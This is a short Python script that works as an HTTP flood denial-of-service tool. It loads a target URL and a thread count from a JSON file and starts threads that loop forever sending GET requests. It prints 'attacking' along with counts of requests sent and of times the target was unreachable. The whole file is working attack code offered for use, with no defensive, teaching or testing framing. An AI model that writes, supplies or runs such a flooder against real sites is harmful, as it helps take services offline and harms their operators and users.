import requests
import threading
import json
from time import sleep


req_count = 0
try_count = 0

with open('url.json','r') as file:
    json_dictonary = json.load(file)
    url = json_dictonary['url']
    numberOfThreads = json_dictonary['number of threads'] 
print(f'attacking: {url}')


def attack(x):
    while 1:
        try:
            global req_count
            res = requests.get(x)
            if req_count%100==0:
                print(f'sent requests:{req_count} {res}')
            req_count = req_count + 1
        except:
            global try_count
            try_count= try_count +1
            print(f'unreachable count: {try_count}')
            
            

threads=[]

for i in range(1,numberOfThreads):
    t1 = threading.Thread(target=attack,args=[url])
    threads.append(t1)
for thread in threads:
    #sleep(0.5) starts every thread in 5 seconds
    thread.start()
print(f'all {numberOfThreads} threads are running')
